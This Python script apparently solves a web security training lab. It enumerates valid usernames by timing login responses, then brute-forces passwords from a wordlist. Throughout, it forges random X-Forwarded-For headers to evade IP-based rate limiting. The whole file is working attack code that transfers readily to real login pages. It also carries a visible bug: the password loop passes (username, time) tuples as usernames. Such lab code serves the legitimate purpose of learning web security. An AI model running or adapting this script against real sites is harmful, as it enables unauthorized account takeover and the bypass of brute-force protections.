import requests
from bs4 import BeautifulSoup
import math
from random import randint

# Set the URL and necessary headers
url = 'https://0a70007b0483bdb0826f33cd00f40034.web-security-academy.net/login'
cookies = {'session': '9yWY61V7SdSOSYZpV7TccHgp4sV7F4rn'}


# Generate different IP addresses to simulate different users
def random_ip_generator():
    return "{}.{}.{}.{}".format(randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255))


# Retrieve the word list
passwords = []
usernames = []
with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()
with open("usernames.txt", "r") as f:
    usernames = f.read().splitlines()


# fist we should find the username and map them to the response time,
# which we know there is a different response time based on a valid username
def find_username_based_on_response_time():
    temp_password = 'kiarash' * 100
    username_to_response_time_temp = []
    for username in usernames:
        ip = random_ip_generator()
        data = {'username': username, 'password': temp_password}

        # Set up the headers with the modified "X-Forwarded-for" header
        headers = {
            'X-Forwarded-For': ip
        }

        # Submit the login request with the given password and IP
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        print((username, response.elapsed.total_seconds()))
        username_to_response_time_temp.append((username, response.elapsed.total_seconds()))
    return username_to_response_time_temp


# (username, response)
username_to_response_time = find_username_based_on_response_time()

# calculate average, variance, Standard deviation
# to determine the range which all the response time are mostly in.
# then we eliminate them all and what remain, are the outlier responses which has more distance to the average
# and could be the username
# This is not really necessary while we can sort responses and check them all.
# but it is more convenient.
# response_times = list(map(lambda item: item[1], username_to_response_time))
# response_times_len = len(response_times)
# response_times_sum = sum(response_times)
#
# statistics
# avg_response_time = response_times_sum / response_times_len
# var_response_time = sum((xi - avg_response_time) ** 2 for xi in response_times) / response_times_len
# square_var_response_time = math.sqrt(var_response_time)
#
# usernames_with_high_response_times = list(
#     filter(
#         lambda item: True if item[1] > avg_response_time + square_var_response_time else False,
#         username_to_response_time
#     )
# )
# usernames_with_high_response_times.sort(reverse=True)

# sort the array of tuple based on response times, and ij reverse order.
username_to_response_time.sort(key=lambda item: item[1], reverse=True)
print(username_to_response_time)

# iterate over password with the valid usernames and find the pass word
for username in username_to_response_time:
    for password in passwords:
        ip = random_ip_generator()
        data = {'username': username, 'password': password}

        # Set up the headers with the modified "X-Forwarded-for" header
        headers = {
            'X-Forwarded-For': ip
        }

        # Submit the login request with the given password and IP
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        print(response.status_code)
        if response.status_code == 302:
            print(f'Login Successful with password: {password} and username: {username}')
            break
        else:
            print(f'{username} {password} was not successfully logged in.')
